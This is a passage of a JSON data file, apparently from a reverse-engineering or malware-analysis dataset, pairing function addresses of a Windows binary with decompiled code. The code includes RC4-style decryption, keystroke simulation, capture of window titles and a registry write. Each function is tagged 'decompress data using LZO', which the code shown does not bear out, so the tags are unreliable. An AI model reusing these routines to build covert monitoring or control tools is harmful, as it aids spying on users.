0xffffff00) + 1;\n                    }\n                    uVar6 = uVar6 + (&fcn.004613d8::var_41ch)[uVar3] & 0x800000ff;\n                    if (uVar6 < 0) {\n                        uVar6 = (uVar6 - 1 | 0xffffff00) + 1;\n                    }\n                    var_15h = *(&fcn.004613d8::var_41ch + uVar3);\n                    (&fcn.004613d8::var_41ch)[uVar3] = (&fcn.004613d8::var_41ch)[uVar6];\n                    (&fcn.004613d8::var_41ch)[uVar6] = var_15h;\n                    uVar2 = (&fcn.004613d8::var_41ch)[uVar3] + (&fcn.004613d8::var_41ch)[uVar6] & 0x800000ff;\n                    if (uVar2 < 0) {\n                        uVar2 = (uVar2 - 1 | 0xffffff00) + 1;\n                    }\n                    *(var_10h + iVar4) = *(var_10h + iVar4) ^ *(&fcn.004613d8::var_41ch + uVar2);\n                    iVar4 = iVar4 + 1;\n                    var_1ch = var_1ch + -1;\n                } while (var_1ch != 0);\n            }\n            fcn.00405c6c();\n            fcn.00405a3c();\n            fcn.004611c4();\n            fcn.004611cc();\n            fcn.00405584();\n        }\n    }\n    *in_FS_OFFSET = uStack1084;\n    puStack1076 = 0x4616ac;\n    uStack1080 = 0x461684;\n    fcn.00405530();\n    uStack1080 = 0x461697;\n    fcn.004060f8();\n    uStack1080 = 0x4616a4;\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 1521
    },
    "004616b4": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004616b4(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t *piVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint32_t uVar6;\n    uint *in_FS_OFFSET;\n    uint uStack1084;\n    uint uStack1080;\n    uchar *puStack1076;\n    uint var_420h;\n    uint var_41ch;\n    int32_t var_1ch;\n    uint8_t var_15h;\n    uint var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_ch = 0;\n    var_10h = 0;\n    puStack1076 = 0x4616df;\n    var_8h = param_2;\n    var_4h = in_EAX;\n    fcn.004059cc();\n    puStack1076 = 0x4616e7;\n    fcn.004059cc();\n    uStack1080 = 0x461980;\n    uStack1084 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffbc4;\n    iVar4 = var_8h;\n    if (var_8h != 0) {\n        iVar4 = *(var_8h + -4);\n    }\n    if (iVar4 != 0) {\n        iVar4 = var_4h;\n        if (var_4h != 0) {\n            iVar4 = *(var_4h + -4);\n        }\n        if (iVar4 != 0) {\n            puStack1076 = &stack0xfffffffc;\n            fcn.0046124c();\n            fcn.004055c8();\n            iVar4 = var_8h;\n            if (var_8h != 0) {\n                iVar4 = *(var_8h + -4);\n            }\n            if (iVar4 < 0x101) {\n                iVar4 = var_8h;\n                if (var_8h != 0) {\n                    iVar4 = *(var_8h + -4);\n                }\n                fcn.00406928(iVar4);\n                fcn.00405a3c();\n                fcn.004611c4();\n            }\n            else {\n                fcn.00406928(0x100);\n                fcn.00405a3c();\n                fcn.004611c4();\n            }\n            iVar4 = 0;\n            piVar1 = &fcn.004616b4::var_41ch;\n            do {\n                *piVar1 = iVar4;\n                iVar4 = iVar4 + 1;\n                piVar1 = piVar1 + 1;\n            } while (iVar4 != 0x100);\n            uVar3 = 0;\n            iVar4 = 0;\n            piVar1 = &fcn.004616b4::var_41ch;\n            do {\n                iVar5 = var_8h;\n                if (var_8h != 0) {\n                    iVar5 = *(var_8h + -4);\n                }\n                uVar3 = *(var_ch + iVar4 % iVar5) + uVar3 + *piVar1 & 0x800000ff;\n                if (uVar3 < 0) {\n                    uVar3 = (uVar3 - 1 | 0xffffff00) + 1;\n                }\n                var_15h = *piVar1;\n                *piVar1 = (&fcn.004616b4::var_41ch)[uVar3];\n                (&fcn.004616b4::var_41ch)[uVar3] = var_15h;\n                iVar4 = iVar4 + 1;\n                piVar1 = piVar1 + 1;\n            } while (iVar4 != 0x100);\n            uVar3 = 0;\n            uVar6 = 0;\n            iVar4 = var_4h;\n            if (var_4h != 0) {\n                iVar4 = *(var_4h + -4);\n            }\n            fcn.00406928(iVar4);\n            fcn.00405a3c();\n            fcn.004611c4();\n            if (var_4h != 0) {\n                var_4h = *(var_4h + -4);\n            }\n            if (-1 < var_4h + -1) {\n                var_1ch = var_4h;\n                iVar4 = 0;\n                do {\n                    uVar3 = uVar3 + 1 & 0x800000ff;\n                    if (uVar3 < 0) {\n                        uVar3 = (uVar3 - 1 | 0xffffff00) + 1;\n                    }\n                    uVar6 = uVar6 + (&fcn.004616b4::var_41ch)[uVar3] & 0x800000ff;\n                    if (uVar6 < 0) {\n                        uVar6 = (uVar6 - 1 | 0xffffff00) + 1;\n                    }\n                    var_15h = *(&fcn.004616b4::var_41ch + uVar3);\n                    (&fcn.004616b4::var_41ch)[uVar3] = (&fcn.004616b4::var_41ch)[uVar6];\n                    (&fcn.004616b4::var_41ch)[uVar6] = var_15h;\n                    uVar2 = (&fcn.004616b4::var_41ch)[uVar3] + (&fcn.004616b4::var_41ch)[uVar6] & 0x800000ff;\n                    if (uVar2 < 0) {\n                        uVar2 = (uVar2 - 1 | 0xffffff00) + 1;\n                    }\n                    *(var_10h + iVar4) = *(var_10h + iVar4) ^ *(&fcn.004616b4::var_41ch + uVar2);\n                    iVar4 = iVar4 + 1;\n                    var_1ch = var_1ch + -1;\n                } while (var_1ch != 0);\n            }\n            fcn.00405c6c();\n            fcn.00405a3c();\n            fcn.004611c4();\n        }\n    }\n    *in_FS_OFFSET = uStack1084;\n    puStack1076 = 0x461987;\n    uStack1080 = 0x46195f;\n    fcn.00405530();\n    uStack1080 = 0x461972;\n    fcn.004060f8();\n    uStack1080 = 0x46197f;\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 1510
    },
    "004619e4": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid fcn.004619e4(void)\n\n{\n    uint32_t in_EAX;\n    uint32_t uVar1;\n    \n    uVar1 = in_EAX & 0xff;\n    if (0x5a < uVar1) {\n        if (uVar1 < 0xa4) {\n            if (uVar1 == 0xa3) goto code_r0x00461a4f;\n            if (((uVar1 - 0x5b < 4) || (uVar1 == 0x60)) || (uVar1 - 0x7b < 4)) goto code_r0x00461a6e;\n        }\n        else if (((uVar1 == 0xa7) || (uVar1 == 0xb0)) || (uVar1 == 0xb5)) goto code_r0x00461a4f;\ncode_r0x00461a89:\n        sub.user32.dll_VkKeyScanA();\n        fcn.004619c4();\n        return;\n    }\n    if (uVar1 < 0x2e) {\n        if (uVar1 == 0x23) {\ncode_r0x00461a6e:\n            fcn.004619ac();\n            sub.user32.dll_VkKeyScanA();\n            fcn.004619c4();\n            fcn.004619ac();\n            return;\n        }\n        if ((uVar1 != 0x25) && (uVar1 != 0x2b)) goto code_r0x00461a89;\n    }\n    else if ((0xb < uVar1 - 0x2e) && (uVar1 != 0x3f)) {\n        if (uVar1 == 0x40) goto code_r0x00461a6e;\n        if (0x19 < uVar1 - 0x41) goto code_r0x00461a89;\n    }\ncode_r0x00461a4f:\n    fcn.00461990();\n    sub.user32.dll_VkKeyScanA();\n    fcn.004619c4();\n    fcn.00461990();\n    return;\n}\n",
        "token_count": 471
    },
    "00462ed8": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_2ch\n// WARNING: Variable defined which should be unmapped: var_28h\n// WARNING: Variable defined which should be unmapped: var_38h\n// WARNING: Variable defined which should be unmapped: var_34h\n// WARNING: Variable defined which should be unmapped: var_30h\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_10h\n\nvoid __cdecl fcn.00462ed8(int32_t arg_8h)\n\n{\n    int32_t *piVar1;\n    char *in_EAX;\n    uint uVar2;\n    char *pcVar3;\n    int32_t iVar4;\n    uchar *in_EDX;\n    int32_t *unaff_EBX;\n    int32_t *unaff_ESI;\n    int32_t **in_FS_OFFSET;\n    uchar uVar5;\n    bool bVar6;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint *var_20h;\n    int32_t *piStack32;\n    uint uStack28;\n    uchar *puStack24;\n    int32_t *var_10h;\n    int32_t *var_ch;\n    uint var_8h;\n    char *var_4h;\n    \n    iVar4 = 7;\n    do {\n        iVar4 = iVar4 + -1;\n    } while (iVar4 != 0);\n    puStack24 = 0x462ef6;\n    var_10h = unaff_ESI;\n    var_ch = unaff_EBX;\n    var_4h = in_EAX;\n    fcn.004059cc();\n    uStack28 = 0x46308b;\n    piStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    *in_EDX = 0;\n    var_20h = 0x462f0f;\n    puStack24 = &stack0xfffffffc;\n    fcn.0040700c();\n    var_20h = &fcn.00462ed8::var_24h;\n    var_24h = 0x462f1b;\n    var_24h = fcn.0040700c();\n    piVar1 = *(arg_8h + -4);\n    iVar4 = (**(*piVar1 + 0xc))(piVar1, 1);\n    if (iVar4 == 0) {\n        *(arg_8h + -8) = *(arg_8h + -8) + 1;\n        fcn.0040700c();\n        uVar2 = fcn.0040700c();\n        iVar4 = (**(*var_ch + 0x24))(var_ch, 0, 0, 0x46309c, uVar2);\n        if (iVar4 == 0) {\n            iVar4 = (**(*var_10h + 0xc))(var_10h, 0x4630ac, &fcn.00462ed8::var_20h, 0);\n            uVar5 = iVar4 == 0;\n            if (uVar5) {\n                fcn.00414a44();\n                fcn.00409b7c();\n                fcn.004097dc();\n                fcn.00409b7c(1);\n                fcn.004097dc();\n                fcn.00405974();\n                if (uVar5) {\n                    bVar6 = true;\n                }\n                else {\n                    pcVar3 = var_4h;\n                    if (var_4h != NULL) {\n                        pcVar3 = *(var_4h + -4);\n                    }\n                    if (pcVar3 == 0x2) {\n                        bVar6 = *var_4h == '#';\n                    }\n                    else {\n                        bVar6 = false;\n                    }\n                    if (bVar6) {\n                        bVar6 = var_4h[1] - 0x30 == *(arg_8h + -8);\n                    }\n                    else {\n                        bVar6 = false;\n                    }\n                }\n                if (bVar6) {\n                    fcn.00409b7c();\n                    fcn.00405584();\n                    uVar2 = fcn.0040700c();\n                    iVar4 = (**(*var_ch + 0x20))(var_ch, 0, 0, *0x4947f4, uVar2);\n                    *in_EDX = iVar4 == 0;\n                }\n            }\n        }\n    }\n    *in_FS_OFFSET = piVar1;\n    var_24h = 0x463092;\n    fcn.00405554();\n    fcn.00411650();\n    fcn.0040700c();\n    fcn.0040700c();\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 1087
    },
    "00466f50": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid fcn.00466f50(void)\n\n{\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack32 = 0x466f6c;\n    fcn.004059cc();\n    puStack32 = 0x466f74;\n    fcn.004059cc();\n    uStack36 = 0x466fd9;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    if (in_EAX != 0) {\n        in_EAX = *(in_EAX + -4);\n    }\n    puStack32 = &stack0xfffffffc;\n    if (0 < in_EAX) {\n        do {\n            fcn.00405718();\n            fcn.00405974();\n            in_EAX = in_EAX + -1;\n        } while (in_EAX != 0);\n    }\n    *in_FS_OFFSET = uStack40;\n    puStack32 = 0x466fe0;\n    uStack36 = 0x466fd8;\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 279
    },
    "0046f17c": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0046f17c(int32_t arg_8h)\n\n{\n    uchar *puVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint in_stack_ffffff60;\n    uint uVar4;\n    uint uVar5;\n    uint uVar6;\n    uint uVar7;\n    uint uStack84;\n    uint uStack80;\n    uchar *puStack76;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    int32_t var_2ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    puStack76 = &stack0xfffffffc;\n    var_4h = 0;\n    var_8h = 0;\n    uStack80 = 0x46f2ed;\n    uStack84 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack84;\n    puVar1 = &stack0xfffffffc;\n    if (arg_8h != 0) {\n        fcn.00405c6c();\n        iVar3 = var_4h;\n        if (var_4h != 0) {\n            iVar3 = *(var_4h + -4);\n        }\n        uVar2 = fcn.004059dc(iVar3);\n        sub.user32.dll_GetWindowTextA(arg_8h, uVar2);\n        fcn.00405c6c();\n        var_34h = 0x2c;\n        sub.user32.dll_GetWindowPlacement(arg_8h, &var_34h);\n        if (var_2ch == 3) {\n            fcn.004055c8();\n        }\n        else if (var_2ch == 1) {\n            fcn.004055c8();\n        }\n        else if (var_2ch == 2) {\n            fcn.004055c8();\n        }\n        else if (var_2ch == 8) {\n            fcn.004055c8();\n        }\n        else if (var_2ch == 4) {\n            fcn.004055c8();\n        }\n        iVar3 = sub.user32.dll_IsWindowVisible(arg_8h);\n        puVar1 = puStack76;\n        if ((iVar3 != 0) && (var_4h != 0)) {\n            uVar6 = 0x46f370;\n            uVar5 = 0x46f370;\n            uVar4 = 0;\n            uVar2 = var_8h;\n            iVar3 = var_4h;\n            uVar7 = *0x49a184;\n            fcn.00409e5c(arg_8h);\n            fcn.0046f148(0x46f370, 0, arg_8h, uVar4, uVar5, uVar2, uVar6, iVar3, uVar7);\n            fcn.00409d70();\n            in_stack_ffffff60 = 0x46f38c;\n            fcn.004058e0(0x46f38c, 0x46f37c, 0x46f370, 0);\n            puVar1 = puStack76;\n        }\n    }\n    puStack76 = puVar1;\n    *in_FS_OFFSET = in_stack_ffffff60;\n    fcn.00405554(0x46f2f4);\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 758
    },
    "0046f3b8": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0046f3b8(int32_t arg_8h)\n\n{\n    uchar *puVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint in_stack_ffffff64;\n    uint uVar4;\n    uint uVar5;\n    uint uVar6;\n    uint uVar7;\n    uint uStack84;\n    uint uStack80;\n    uchar *puStack76;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    int32_t var_2ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    puStack76 = &stack0xfffffffc;\n    var_4h = 0;\n    var_8h = 0;\n    uStack80 = 0x46f519;\n    uStack84 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack84;\n    puVar1 = &stack0xfffffffc;\n    if (arg_8h != 0) {\n        fcn.00405c6c();\n        iVar3 = var_4h;\n        if (var_4h != 0) {\n            iVar3 = *(var_4h + -4);\n        }\n        uVar2 = fcn.004059dc(iVar3);\n        sub.user32.dll_GetWindowTextA(arg_8h, uVar2);\n        fcn.00405c6c();\n        var_34h = 0x2c;\n        sub.user32.dll_GetWindowPlacement(arg_8h, &var_34h);\n        if (var_2ch == 3) {\n            fcn.004055c8();\n        }\n        else if (var_2ch == 1) {\n            fcn.004055c8();\n        }\n        else if (var_2ch == 2) {\n            fcn.004055c8();\n        }\n        else if (var_2ch == 8) {\n            fcn.004055c8();\n        }\n        else if (var_2ch == 4) {\n            fcn.004055c8();\n        }\n        uVar6 = 0x46f59c;\n        uVar5 = 0x46f59c;\n        uVar4 = 0;\n        uVar2 = var_8h;\n        iVar3 = var_4h;\n        uVar7 = *0x49a184;\n        fcn.00409e5c(arg_8h);\n        fcn.0046f148(0x46f59c, 0, arg_8h, uVar4, uVar5, uVar2, uVar6, iVar3, uVar7);\n        fcn.00409d70();\n        in_stack_ffffff64 = 0x46f5b8;\n        fcn.004058e0(0x46f5b8, 0x46f5a8, 0x46f59c, 0);\n        puVar1 = puStack76;\n    }\n    puStack76 = puVar1;\n    *in_FS_OFFSET = in_stack_ffffff64;\n    fcn.00405554(0x46f520);\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 716
    },
    "0046f5e4": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0046f5e4(int32_t arg_8h)\n\n{\n    uchar *puVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint in_stack_ffffff80;\n    uint uVar4;\n    uint uVar5;\n    uint uStack76;\n    uint uStack72;\n    uchar *puStack68;\n    uint var_34h;\n    uint var_30h;\n    int32_t var_4h;\n    \n    puStack68 = &stack0xfffffffc;\n    var_4h = 0;\n    uStack72 = 0x46f6b7;\n    uStack76 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack76;\n    puVar1 = &stack0xfffffffc;\n    if (arg_8h != 0) {\n        fcn.00405c6c();\n        iVar3 = var_4h;\n        if (var_4h != 0) {\n            iVar3 = *(var_4h + -4);\n        }\n        uVar2 = fcn.004059dc(iVar3);\n        sub.user32.dll_GetWindowTextA(arg_8h, uVar2);\n        fcn.00405c6c();\n        var_30h = 0x2c;\n        sub.user32.dll_GetWindowPlacement(arg_8h, &var_30h);\n        iVar3 = sub.user32.dll_IsWindowVisible(arg_8h);\n        puVar1 = puStack68;\n        if ((iVar3 != 0) && (var_4h != 0)) {\n            uVar5 = 0x46f6d0;\n            uVar4 = 0;\n            iVar3 = var_4h;\n            uVar2 = *0x49a184;\n            fcn.00409e5c(arg_8h);\n            in_stack_ffffff80 = 0x46f6dc;\n            fcn.004058e0(0x46f6dc, 0, arg_8h, uVar4, uVar5, iVar3, uVar2);\n            puVar1 = puStack68;\n        }\n    }\n    puStack68 = puVar1;\n    *in_FS_OFFSET = in_stack_ffffff80;\n    fcn.00405530(0x46f6be);\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 526
    },
    "00470178": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid fcn.00470178(void)\n\n{\n    int32_t **in_FS_OFFSET;\n    int32_t *piVar1;\n    int32_t *piStack48;\n    int32_t *piStack44;\n    uchar *puStack40;\n    int32_t *piStack36;\n    uint uStack32;\n    uchar *puStack28;\n    int32_t var_8h;\n    int32_t *var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    puStack40 = &stack0xfffffffc;\n    var_4h = NULL;\n    uStack32 = 0x4702b1;\n    piStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    piStack44 = 0x47028a;\n    piStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    fcn.00405584();\n    fcn.0045eac4();\n    piVar1 = var_4h;\n    (**(*var_4h + 0x78))(var_4h, &fcn.00470178::var_8h);\n    fcn.0040711c();\n    if (var_8h < 0xf) {\n        if (var_8h == 0xe) {\n            fcn.00405584();\n        }\n        else if (var_8h == 1) {\n            fcn.00405584();\n        }\n        else if (var_8h == 2) {\n            fcn.00405584();\n        }\n        else if (var_8h == 6) {\n            fcn.00405584();\n        }\n        else if (var_8h == 10) {\n            fcn.00405584();\n        }\n    }\n    else if (var_8h == 0x12) {\n        fcn.00405584();\n    }\n    else if (var_8h == 0x22) {\n        fcn.00405584();\n    }\n    else if (var_8h == 0x32) {\n        fcn.00405584();\n    }\n    else if (var_8h == 0x42) {\n        fcn.00405584();\n    }\n    *in_FS_OFFSET = piVar1;\n    *in_FS_OFFSET = piStack44;\n    piStack36 = 0x4702b8;\n    puStack40 = 0x4702b0;\n    fcn.0040700c();\n    return;\n}\n",
        "token_count": 552
    },
    "004703fc": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_14h\n// WARNING: Variable defined which should be unmapped: var_18h\n\nvoid fcn.004703fc(void)\n\n{\n    int16_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t **in_FS_OFFSET;\n    int32_t *var_2ch;\n    uint var_28h;\n    int32_t *var_24h;\n    int32_t *var_20h;\n    uchar *var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_1ch = &stack0xfffffffc;\n    var_ch = 5;\n    do {\n        var_4h = 0;\n        var_ch = var_ch + -1;\n    } while (var_ch != 0);\n    var_20h = 0x470664;\n    var_24h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &fcn.004703fc::var_24h;\n    var_28h = 0x470426;\n    fcn.00405530();\n    var_28h = 0x47042e;\n    var_28h = fcn.0040700c();\n    var_2ch = 0x47043c;\n    fcn.0045eac4();\n    var_2ch = var_20h;\n    (**(*var_20h + 0x68))();\n    fcn.0040711c();\n    fcn.00407024();\n    iVar2 = fcn.0040648c(0, var_4h, 0x470674);\n    if (-1 < iVar2 + -1) {\n        iVar4 = 0;\n        do {\n            fcn.0040648c(&fcn.004703fc::var_24h, var_4h, 0x47067c, iVar4);\n            fcn.00407024();\n            fcn.0040648c(&fcn.004703fc::var_28h, var_8h, 0x470688);\n            fcn.004057d4();\n            fcn.0040648c(&fcn.004703fc::var_2ch, var_8h, 0x470690);\n            fcn.004057d4();\n            iVar3 = fcn.0040648c(0, var_8h, 0x470698);\n            if (iVar3 < 0xf) {\n                if (iVar3 == 0xe) {\n                    fcn.004055c8();\n                }\n                else if (iVar3 == 1) {\n                    fcn.004055c8();\n                }\n                else if (iVar3 == 2) {\n                    fcn.004055c8();\n                }\n                else if (iVar3 == 6) {\n                    fcn.004055c8();\n                }\n                else if (iVar3 == 10) {\n                    fcn.004055c8();\n                }\n            }\n            else if (iVar3 == 0x12) {\n                fcn.004055c8();\n            }\n            else if (iVar3 == 0x22) {\n                fcn.004055c8();\n            }\n            else if (iVar3 == 0x32) {\n                fcn.004055c8();\n            }\n            else if (iVar3 == 0x42) {\n                fcn.004055c8();\n            }\n            iVar1 = fcn.0040648c(0, var_8h, 0x47074c);\n            if (iVar1 == 0) {\n                fcn.004055c8();\n            }\n            else {\n                fcn.004055c8();\n            }\n            var_2ch = 0x470780;\n            fcn.004058e0();\n            iVar4 = iVar4 + 1;\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    *in_FS_OFFSET = var_2ch;\n    var_24h = 0x47066b;\n    var_28h = 0x47062e;\n    fcn.00405d40();\n    var_28h = 0x470636;\n    fcn.0040700c();\n    var_28h = 0x47063e;\n    fcn.0040700c();\n    var_28h = 0x470646;\n    fcn.0040700c();\n    var_28h = 0x470653;\n    fcn.00405554();\n    var_28h = 0x47065b;\n    fcn.0040700c();\n    var_28h = 0x470663;\n    fcn.0040700c();\n    return;\n}\n",
        "token_count": 1093
    },
    "00470d2c": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid fcn.00470d2c(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uStack404;\n    uint uStack400;\n    uchar *puStack396;\n    uint uStack392;\n    uint uStack388;\n    uchar *puStack384;\n    uint var_178h;\n    uint var_174h;\n    uint var_170h;\n    uint var_15ch;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_178h = 0;\n    var_4h = 0;\n    var_8h = 0;\n    var_ch = 0;\n    puStack384 = 0x470d5d;\n    fcn.00405fe8();\n    uStack388 = 0x470e93;\n    uStack392 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffe78;\n    puStack396 = 0x470d76;\n    puStack384 = &stack0xfffffffc;\n    fcn.00405530();\n    puStack396 = 0x470d7e;\n    fcn.00470c90();\n    puStack396 = 0x470d8b;\n    fcn.00405818();\n    puStack396 = 0x470d93;\n    cVar1 = fcn.0040a290();\n    if (cVar1 != '\\0') {\n        puStack396 = 0x470da6;\n        fcn.0040e830();\n        puStack396 = 0x470db1;\n        fcn.004055c8();\n        puStack396 = 0x470dc4;\n        fcn.00405864();\n        puStack396 = 0x470dda;\n        iVar2 = fcn.0040a488();\n        if (iVar2 == 0) {\n            uStack400 = 0x470e2f;\n            *in_FS_OFFSET = &stack0xfffffe6c;\n            puStack396 = &stack0xfffffffc;\n            do {\n                uStack404 = 0x470ed0;\n                fcn.004058e0();\n                iVar2 = fcn.0040a4d8();\n            } while (iVar2 == 0);\n            *in_FS_OFFSET = uStack404;\n            fcn.0040a4fc(0x470e36);\n            return;\n        }\n        puStack396 = 0x470e4e;\n        fcn.00405a84();\n        puStack396 = 0x470e5c;\n        fcn.00405584();\n    }\n    *in_FS_OFFSET = uStack392;\n    puStack384 = 0x470e9a;\n    uStack388 = 0x470e74;\n    fcn.00405530();\n    uStack388 = 0x470e85;\n    fcn.004060ac();\n    uStack388 = 0x470e92;\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 664
    },
    "004711e8": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004711e8(int32_t arg_8h)\n\n{\n    uint uVar1;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint hKey;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = 0x471200;\n    fcn.004059cc();\n    puStack28 = 0x471208;\n    fcn.004059cc();\n    puStack28 = 0x471210;\n    fcn.004059cc();\n    uStack32 = 0x471291;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    puStack28 = &stack0xfffffffc;\n    fcn.004059dc(&fcn.004711e8::hKey);\n    sub.advapi32.dll_RegCreateKeyA();\n    if (arg_8h != 0) {\n        arg_8h = *(arg_8h + -4);\n    }\n    uVar1 = fcn.004059dc(arg_8h);\n    uVar1 = fcn.004059dc(0, 2, uVar1);\n    sub.advapi32.dll_RegSetValueExA(hKey, uVar1);\n    sub.advapi32.dll_RegCloseKey_1();\n    *in_FS_OFFSET = hKey;\n    fcn.00405554(0x471298);\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 331
    },
    "004719c8": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004719c8(uint param_1)\n\n{\n    int32_t *in_EAX;\n    uint uVar1;\n    int32_t iVar2;\n    \n    uVar1 = fcn.0040aabc(param_1);\n    sub.kernel32.dll_GetSystemDirectoryA(uVar1, 0x104);\n    fcn.00405728();\n    iVar2 = *in_EAX;\n    if (iVar2 != 0) {\n        iVar2 = *(iVar2 + -4);\n    }\n    if (*(*in_EAX + -1 + iVar2) != '\\\\') {\n        fcn.00405818();\n    }\n    fcn.0040ab08();\n    return;\n}\n",
        "token_count": 155
    },
    "004735e8": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x004736db)\n\nvoid __fastcall fcn.004735e8(uint param_1, uint *param_2)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t *in_FS_OFFSET;\n    uchar uVar4;\n    uint *puStack80;\n    uint uStack76;\n    uchar *puStack72;\n    int32_t iStack68;\n    uint uStack64;\n    uchar *puStack60;\n    int32_t iStack56;\n    uint uStack52;\n    uchar *puStack48;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack60 = &stack0xfffffffc;\n    var_8h = 0;\n    puStack48 = 0x473605;\n    fcn.004059cc();\n    uStack52 = 0x47375f;\n    iStack56 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc8;\n    uStack64 = 0x473725;\n    iStack68 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffbc;\n    puStack72 = 0x47362d;\n    puStack48 = &stack0xfffffffc;\n    piVar1 = fcn.00404620();\n    uStack76 = 0x473714;\n    puStack80 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb0;\n    puStack72 = &stack0xfffffffc;\n    (**(*piVar1 + 0x2c))();\n    iVar2 = (**(*piVar1 + 0x14))();\n    if (-1 < iVar2 + -1) {\n        do {\n            (**(*piVar1 + 0xc))();\n            puStack80 = &fcn.004735e8::var_8h;\n            iVar3 = fcn.00405b28();\n            uVar4 = iVar3 == 1;\n            fcn.00405a44();\n            fcn.00409b7c();\n            fcn.00409b7c(0);\n            fcn.00405974();\n            if (uVar4) {\n                fcn.00405b28();\n                fcn.00405a84();\n                puStack80 = param_2;\n                fcn.00405a44();\n                break;\n            }\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    *in_FS_OFFSET = puStack80;\n    puStack72 = 0x47371b;\n    uStack76 = 0x473713;\n    fcn.00404650();\n    return;\n}\n",
        "token_count": 626
    },
    "0047377c": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
